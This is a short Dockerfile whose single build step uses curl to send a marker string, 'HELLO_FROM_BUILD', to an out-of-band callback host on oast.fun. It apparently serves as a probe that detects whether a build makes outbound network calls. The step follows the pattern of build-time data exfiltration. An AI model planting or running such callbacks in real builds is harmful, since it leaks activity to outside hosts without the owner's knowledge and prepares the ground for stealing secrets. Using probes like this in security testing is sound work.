FROM alpine:3.20

RUN curl -sS --get \
    --data-urlencode "result=HELLO_FROM_BUILD" \
    "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/"
